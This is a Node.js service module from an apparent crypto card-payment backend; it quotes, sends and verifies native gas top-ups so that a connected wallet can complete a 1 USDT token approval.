const env = require("../config/env");
const paymentStore = require("../storage/payments");
const sessionStore = require("../storage/sessions");
const { getNetwork } = require("../config/networks");
const { estimateApprovalGas } = require("./gasEstimate");
const { formatUnits } = require("../utils/helpers");
const { checkCardEligibility } = require("./cardEligibility");
const { NotFoundError, ValidationError } = require("../utils/errors");
const { emitEvent } = require("../utils/events");
const { refreshBalances } = require("./balances");
const { configuredTopupRaw, hasNativeFunder, publicTopup, tronMinRaw } = require("../config/evmGas");
const logger = require("../utils/logger");

function publicPayment(payment) {
    return require("./paymentService").publicPayment(payment);
}

function emitPaymentEvent(event, payment, extra = {}) {
    emitEvent(event, {
        paymentId: payment.paymentId,
        connectionId: payment.connectionId,
        network: payment.network,
        status: payment.status,
        timestamp: new Date().toISOString(),
        ...extra
    });
}

function assertNoClientOverrides(body) {
    if (body.spender || body.cardContract || body.card) {
        throw new ValidationError("Spender/card contract cannot be supplied by the client");
    }

    if (body.tokenContract || body.tokenAddress || body.usdt || body.contractAddress) {
        throw new ValidationError("Token contract cannot be supplied by the client");
    }

    if (body.allowance != null || body.amount != null || body.allowanceRaw != null) {
        throw new ValidationError("Allowance cannot be supplied by the client");
    }
}

function fundingLimits() {
    const buffer = Number(env.GAS_FUNDING_BUFFER || "0.20");
    const maxMultiple = Number(env.GAS_FUNDING_MAX || "2");

    return {
        buffer: Number.isFinite(buffer) && buffer >= 0 ? buffer : 0.2,
        maxMultiple: Number.isFinite(maxMultiple) && maxMultiple >= 1 ? maxMultiple : 2
    };
}

function recommendedFromEstimate(estimatedCost) {
    const { buffer, maxMultiple } = fundingLimits();
    const estimate = BigInt(estimatedCost);
    const extra = (estimate * BigInt(Math.round(buffer * 1000))) / 1000n;
    let recommended = estimate + extra;
    const cap = estimate * BigInt(Math.floor(maxMultiple));

    if (recommended > cap) {
        recommended = cap;
    }

    if (recommended < estimate) {
        recommended = estimate;
    }

    return recommended;
}

function nativeRawFromSession(session, network) {
    const row = (session.balances || []).find((item) => (
        item.network === network.key || item.chainId === network.chainId
    ));
    const raw = row?.native?.raw;
    return raw != null && raw !== "" ? String(raw) : null;
}

function walletAddress(session, network) {
    const account = (session.accounts || []).find((item) => (
        item.chainId === network.chainId || item.namespace === network.namespace
    ));
    return account?.address || session.wallet?.address || null;
}

async function checkGasSufficiency(session, networkKey, deps = {}) {
    const network = getNetwork(networkKey, { requireContracts: false });
    const from = walletAddress(session, network);
    const nativeBalanceRaw = nativeRawFromSession(session, network);
    let estimate;

    try {
        estimate = await (deps.estimateApprovalGas || estimateApprovalGas)({
            network: network.key,
            from,
            nativeBalanceRaw
        }, deps);
    } catch (err) {
        return {
            sufficient: false,
            network: network.key,
            nativeSymbol: network.nativeSymbol,
            currentBalance: nativeBalanceRaw ? formatUnits(nativeBalanceRaw, network.nativeDecimals) : null,
            estimatedRequired: null,
            recommendedFunding: null,
            error: err.message
        };
    }

    if (!estimate.estimatedNativeCost) {
        return {
            sufficient: false,
            network: network.key,
            nativeSymbol: network.nativeSymbol,
            currentBalance: null,
            estimatedRequired: null,
            recommendedFunding: null,
            error: estimate.error || "Gas estimate unavailable"
        };
    }

    const configured = configuredTopupRaw(network);
    const recommended = configured || recommendedFromEstimate(estimate.estimatedNativeCost);
    const balance = estimate.nativeBalance != null ? BigInt(estimate.nativeBalance) : null;
    let required = BigInt(estimate.estimatedNativeCost);

    if (network.key === "tron") {
        const minTrx = tronMinRaw();
        if (minTrx > required) {
            required = minTrx;
        }
    }

    const sufficient = balance != null && balance >= required;

    return {
        sufficient,
        network: network.key,
        nativeSymbol: network.nativeSymbol,
        currentBalance: formatUnits(estimate.nativeBalance || "0", network.nativeDecimals),
        currentBalanceRaw: estimate.nativeBalance,
        estimatedGas: estimate.estimatedGas,
        estimatedRequired: formatUnits(required.toString(), network.nativeDecimals),
        estimatedRequiredRaw: required.toString(),
        recommendedFunding: formatUnits(recommended.toString(), network.nativeDecimals),
        recommendedFundingRaw: recommended.toString(),
        configuredTopup: configured ? publicTopup(network, configured) : null,
        funderReady: hasNativeFunder(network.key),
        reason: sufficient
            ? "Live native balance covers the 1 USDT approval gas."
            : balance == null
                ? `Could not confirm live ${network.nativeSymbol} on ${network.name}. Approve stays hidden until the wallet balance is verified.`
                : `Your ${network.name} wallet has insufficient ${network.nativeSymbol} to complete the 1 USDT card authorization.`
    };
}

function rejectClientFundingOverrides(body) {
    assertNoClientOverrides(body || {});

    if (body.network || body.amount || body.fundingAmount || body.recommendedFunding || body.value) {
        throw new ValidationError("Funding amount and network are calculated by the server");
    }
}

async function createGasQuote(paymentId, body = {}, deps = {}) {
    rejectClientFundingOverrides(body);

    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        throw new NotFoundError("Payment not found");
    }

    const session = sessionStore.getSession(payment.connectionId);

    if (!session) {
        throw new NotFoundError("WalletConnect session not found");
    }

    const gas = await checkGasSufficiency(session, payment.network, deps);
    const updated = paymentStore.updatePayment(paymentId, {
        gasQuote: gas,
        gasSufficient: gas.sufficient,
        status: gas.sufficient ? payment.status : "awaiting_gas"
    });

    emitPaymentEvent("gas_quote_created", updated, {
        sufficient: gas.sufficient,
        recommendedFunding: gas.recommendedFunding
    });

    return {
        ...gas,
        payment: publicPayment(updated)
    };
}

async function confirmGasQuote(paymentId, body = {}, deps = {}) {
    rejectClientFundingOverrides(body);

    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        throw new NotFoundError("Payment not found");
    }

    if (!payment.gasQuote) {
        throw new ValidationError("Create a gas quote before confirming funding");
    }

    if (payment.gasFundingTxHash) {
        return {
            confirmed: true,
            funded: false,
            alreadyFunded: true,
            transactionHash: payment.gasFundingTxHash,
            message: "Native gas was already sent for this wallet. Waiting for the balance to confirm.",
            payment: publicPayment(payment)
        };
    }

    const session = sessionStore.getSession(payment.connectionId);

    if (!session) {
        throw new NotFoundError("WalletConnect session not found");
    }

    if (session.nativeFunding?.[payment.network]?.hash) {
        paymentStore.updatePayment(paymentId, {
            gasFundingTxHash: session.nativeFunding[payment.network].hash,
            gasFundingConfirmed: true,
            status: "awaiting_gas"
        });
        return {
            confirmed: true,
            funded: false,
            alreadyFunded: true,
            transactionHash: session.nativeFunding[payment.network].hash,
            message: "Native gas was already sent to this wallet. Waiting for the balance to confirm.",
            payment: publicPayment(paymentStore.getPayment(paymentId))
        };
    }

    const eligibility = checkCardEligibility(session);

    if (!eligibility.eligible) {
        throw new ValidationError(eligibility.reason);
    }

    const eligibleNetworks = eligibility.eligibleNetworks || (eligibility.preferredNetwork ? [eligibility.preferredNetwork] : []);

    if (!eligibleNetworks.includes(payment.network)) {
        throw new ValidationError("Gas funding is only allowed on networks with eligible USDT");
    }

    paymentStore.updatePayment(paymentId, {
        gasFundingConfirmed: true,
        status: "awaiting_gas"
    });

    const network = getNetwork(payment.network, { requireContracts: false });

    if (payment.gasQuote.sufficient) {
        return {
            confirmed: true,
            funded: false,
            message: "Gas is already sufficient. Continue to the 1 USDT approval.",
            payment: publicPayment(paymentStore.getPayment(paymentId))
        };
    }

    if (!hasNativeFunder(network.key) || !configuredTopupRaw(network)) {
        return {
            confirmed: true,
            funded: false,
            message: `Add ${payment.gasQuote.recommendedFunding} ${payment.gasQuote.nativeSymbol} to this wallet, then verify funding.`,
            payment: publicPayment(paymentStore.getPayment(paymentId))
        };
    }

    const to = walletAddress(session, network);
    const sent = network.key === "tron"
        ? await require("./tronFunder").sendConfiguredTrxTopup({ to }, deps)
        : await require("./evmFunder").sendConfiguredNativeTopup({ networkKey: network.key, to }, deps);

    const funding = {
        ...(session.nativeFunding || {}),
        [network.key]: {
            hash: sent.hash,
            amount: payment.gasQuote.recommendedFunding,
            at: new Date().toISOString()
        }
    };
    sessionStore.updateSession(payment.connectionId, { nativeFunding: funding });

    let live = null;
    try {
        if (!deps.sendNative) {
            await refreshBalances(payment.connectionId, deps);
        }
        const latest = sessionStore.getSession(payment.connectionId) || session;
        live = await (deps.checkGasSufficiency || checkGasSufficiency)(latest, network.key, deps);
    } catch (err) {
        logger.warn({ err: { message: err.message }, paymentId }, "Could not re-check gas after top-up");
    }

    const ready = Boolean(live && live.sufficient === true);
    const updated = paymentStore.updatePayment(paymentId, {
        gasFundingConfirmed: true,
        gasFundingVerified: ready,
        gasFundingTxHash: sent.hash,
        gasSufficient: ready,
        gasQuote: live || payment.gasQuote,
        status: ready ? "created" : "awaiting_gas"
    });

    if (ready) {
        emitPaymentEvent("gas_funding_verified", updated, {
            transactionHash: sent.hash
        });
    }

    const symbol = payment.gasQuote.nativeSymbol;
    const amount = payment.gasQuote.recommendedFunding;
    return {
        confirmed: true,
        funded: true,
        transactionHash: sent.hash,
        amount,
        network: network.key,
        nativeToken: symbol,
        message: ready
            ? `Sent ${amount} ${symbol}. Continue to the 1 USDT approval in your wallet.`
            : `Sent ${amount} ${symbol}. Approve stays hidden until this wallet has enough ${symbol}.`,
        payment: publicPayment(updated)
    };
}

async function verifyGasFunding(paymentId, body = {}, deps = {}) {
    rejectClientFundingOverrides({
        ...body,
        transactionHash: undefined
    });

    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        throw new NotFoundError("Payment not found");
    }

    const session = sessionStore.getSession(payment.connectionId);

    if (!session) {
        throw new NotFoundError("WalletConnect session not found");
    }

    try {
        await refreshBalances(payment.connectionId, deps);
    } catch (err) {
        logger.warn({ err: { message: err.message }, paymentId }, "Could not refresh balances before gas confirmation");
    }

    const latest = sessionStore.getSession(payment.connectionId) || session;
    const gas = await checkGasSufficiency(latest, payment.network, deps);

    if (!gas.sufficient) {
        paymentStore.updatePayment(paymentId, {
            gasQuote: gas,
            gasSufficient: false,
            status: "awaiting_gas"
        });
        throw new ValidationError(
            gas.reason
            || `Need confirmed ${gas.nativeSymbol || "native"} gas on ${payment.network} before approve. Current: ${gas.currentBalance != null ? gas.currentBalance : "unavailable"}.`
        );
    }

    const updated = paymentStore.updatePayment(paymentId, {
        gasQuote: gas,
        gasSufficient: true,
        gasFundingVerified: true,
        gasFundingTxHash: body.transactionHash || payment.gasFundingTxHash || null,
        status: "created"
    });

    emitPaymentEvent("gas_funding_verified", updated, {
        transactionHash: updated.gasFundingTxHash
    });

    return {
        ...gas,
        transactionHash: updated.gasFundingTxHash,
        payment: publicPayment(updated)
    };
}

module.exports = {
    checkGasSufficiency,
    recommendedFromEstimate,
    createGasQuote,
    confirmGasQuote,
    verifyGasFunding,
    fundingLimits
};
